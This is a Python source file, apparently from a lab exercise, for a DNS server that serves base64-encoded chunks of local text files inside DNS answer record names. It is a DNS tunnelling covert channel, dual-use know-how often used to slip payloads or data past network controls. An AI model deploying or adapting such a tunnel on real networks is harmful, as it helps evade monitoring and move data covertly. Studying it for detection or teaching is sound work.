import socket

import dnslib
import base64
import hashlib

read_files = {}

port = 53
ip = "192.168.60.128"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((ip, port))

def readTextFile(file_name):
    file_path = f'./{file_name}.txt'
    with open(file_path, 'r') as file:
        file_content = file.read()
    return file_content

def splitFile(file_content, chunk_size):
    splitted_data = []
    for i in range(0, len(file_content), chunk_size):
        splitted_data.append(file_content[i:i+chunk_size])

    return splitted_data

def encodeBase64(content):
    content_bytes = content.encode('utf8')
    b64_content_bytes = base64.b64encode(content_bytes)
    return b64_content_bytes

def gen_hash(payload): 
    md5_hash = hashlib.md5()
    md5_hash.update(payload.encode())
    result = md5_hash.hexdigest()
    return result

def check_save_file(file_name):
    if not file_name in read_files:
        file_content = readTextFile(file_name)
        b64Content = encodeBase64(file_content)
        splitted_content =  splitFile(b64Content,32)
        md5_hash = gen_hash(file_content)
        
        read_files[file_name] = (splitted_content, md5_hash)

def handle_dns_request(data, addr, port):
    dns_request = dnslib.DNSRecord.parse(data)
    payload = str(dns_request.q.qname).rstrip('.')

    splitted_payload = payload.split(".")
    file_name = splitted_payload[-2]

    check_save_file(file_name)

    if len(splitted_payload) == 2:
        send_dns_response(addr, port, len(read_files[file_name][0]))
        return
  
    fragment = splitted_payload[0]

    if int(fragment) == len(read_files[file_name][0]) + 1:

        send_dns_response(addr, port, read_files[file_name][1])
        return 
    
    send_dns_response(addr, port, read_files[file_name][0][int(fragment)])



def send_dns_response(addr, port, data):
    response = dnslib.DNSRecord()
    response.header.rcode = dnslib.RCODE.NOERROR
    response.add_answer(dnslib.RR(
        rname=f"{data}.com",
        rtype=dnslib.QTYPE.A,
        ttl=3600,
        rdata=dnslib.A("127.0.0.1")
    ))
    response_bytes = response.pack()


    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(response_bytes, (addr, port))

    

if __name__ == '__main__':
    received_data = ""

    port = 53
    ip = "192.168.60.128"

    print(f"Server running on {ip}:{port}")

   

    while True:
        data, interface = sock.recvfrom(512)
        addr, incoming_port = interface
    
        handle_dns_request(data, addr, incoming_port)
